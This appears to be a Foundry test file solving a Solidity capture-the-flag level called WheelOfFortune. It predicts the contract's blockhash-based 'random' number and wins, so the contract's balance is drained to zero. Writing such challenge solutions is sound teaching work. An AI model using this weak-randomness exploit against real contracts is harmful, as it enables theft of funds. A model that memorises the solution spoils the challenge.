// SPDX-License-Identifier: MIT
pragma solidity ^0.8.25;

import "./BaseTest.t.sol";
import "src/03_WheelOfFortune/WheelOfFortune.sol";

// forge test --match-contract WheelOfFortuneTest -vvvv
contract WheelOfFortuneTest is BaseTest {
    WheelOfFortune instance;

    function setUp() public override {
        super.setUp();
        instance = new WheelOfFortune{value: 0.01 ether}();
        vm.roll(48743985);
    }

    function testExploitLevel() public {
        instance.spin{value: 0.01 ether}(47);
        bytes32 hash = blockhash(48743985);
        uint256 max = 100;
        uint256 result = uint256(keccak256(abi.encode(hash))) % max;
        instance.spin{value: 0.01 ether}(result);

        checkSuccess();
    }

    function checkSuccess() internal view override {
        assertTrue(address(instance).balance == 0, "Solution is not solving the level");
    }
}
